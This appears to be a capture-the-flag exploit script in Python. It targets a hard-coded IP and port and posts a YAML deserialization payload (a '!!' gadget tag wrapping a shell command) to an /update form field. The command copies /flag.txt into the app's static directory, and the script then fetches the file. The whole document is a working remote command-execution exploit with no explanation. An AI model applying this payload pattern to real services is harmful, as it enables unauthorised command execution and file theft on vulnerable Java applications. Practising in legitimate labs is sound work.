import requests
import re

host, port = "94.237.61.242", 37017

url = f"http://{host}:{port}"
url_update = f"http://{host}:{port}/update"
url_flag = f"http://{host}:{port}/flag.txt"

payload = '!!com.lean.watersnake.GetWaterLevel ["cp /flag.txt /app/build/resources/main/static/flag.txt"]'

data = {
    'config': (None, payload) ##a text form field in multipart/form-data
}

#data = {
#    'config': ('file.txt', payload) ## a file named "file.txt"
#}

##Content-Disposition: form-data; name="config"
response = requests.post(url_update, files=data)

flag = requests.get(url_flag)

print(flag.text)